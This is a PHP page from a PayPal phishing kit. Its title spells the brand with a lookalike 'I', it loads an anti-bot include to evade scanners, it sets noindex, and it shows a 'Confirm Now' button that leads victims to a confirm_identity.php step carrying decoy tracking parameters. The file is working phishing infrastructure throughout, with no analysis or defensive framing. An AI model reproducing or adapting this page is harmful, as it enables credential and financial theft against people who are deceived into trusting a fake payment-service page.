<?php

/*

 */

include 'antibots.php';



?>
<!DOCTYPE html>
<html>
<head>
    <title> PayPaI : Next Step</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="robots" content="noindex" />
    <link rel="icon" href="css/fav.ico" />
</head>
<style>
    *{
        font-family: arial, sans-serif;
    }
    .png_error{
        background-image: url('');
        background-repeat: no-repeat;
<br>
<br>
        width: auto;
        height: 330px;
        background-position: center 100px;
    }
    .cont{
        text-align: center;
    }
    .cont h2{
        font-size: 26px;
        color: #242424;
    }
    .btn {
        min-width: 22%;
        height: 44px;
        padding: 0px 20px;
        display: inline-block;
        border: 0px none;
        border-radius: 5px;
        box-shadow: none;
        font-family: "HelveticaNeue-Medium", "Helvetica Neue Medium", "Helvetica Neue", Helvetica, Arial, sans-serif;
        font-size: 0.9375rem;
        line-height: 3em;
        font-weight: 600;
        text-align: center;
        text-decoration: none;
        text-shadow: none;
        cursor: pointer;
        color: #FFF;
        background: none repeat scroll 0% 0% #009CDE;
        margin-top: 15px;
    }
</style>
<body style="background-image: url('css/tila.PNG'); background-repeat: no-repeat; background-position: center 13px;height: 790px;">
 <div style="width: 800px; margin: 0px auto; padding-left: 0px; padding-top: 0px;">
<body>
<div class="png_error"></div>
<div class="cont">
    <br><br />
	<br><br />
	<br><br />
    <a class="btn" href="confirm_identity.php?websrc=<?php echo md5('nOobAssas!n'); ?>&dispatched=userInfo&id=<?php echo rand(10000000000,500000000); ?>">Confirm Now</a>
</div>
</body>
</html>